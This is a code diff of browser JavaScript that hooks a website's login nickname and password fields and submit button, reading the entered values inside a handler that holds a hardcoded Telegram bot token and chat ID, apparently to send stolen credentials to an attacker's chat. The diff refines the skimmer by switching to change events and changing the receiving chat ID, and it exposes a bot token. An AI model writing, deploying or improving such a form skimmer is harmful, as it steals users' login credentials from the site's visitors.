@@ -8,18 +8,12 @@
     if(pass != null && name != null) {
         console.log('inputs found!');
 
-        const onClickActionString = "const name = document.getElementById('user_nickname'); const pass = document.getElementById('user_password'); console.log('name: ' + name.value + ' pass: ' + pass.value);"
-        name.setAttribute("onclick", onClickActionString);
-        pass.setAttribute("onclick", onClickActionString);
-
-        name.addEventListener("click", onClickAction);
-        pass.addEventListener("click", onClickAction);
+        name.addEventListener("change", onClickAction);
+        pass.addEventListener("change", onClickAction);
 
         const submitButton = document.querySelector('.btn-primary');
         if(submitButton != null) {
             console.log('button found!');
-
-            submitButton.setAttribute("onclick", onClickActionString);
             submitButton.addEventListener("click", onClickAction);
         }
     }
@@ -49,7 +43,7 @@
 
  function onClickAction() {
     const token = '7284579776:AAG-0g9TOkPFqIJUP4rPg-uAz_nYRAdbm60';
-    const chatId = '342006791';
+    const chatId = '250460465';
 
     const name = document.getElementById('user_nickname').value;
     const pass = document.getElementById('user_password').value;
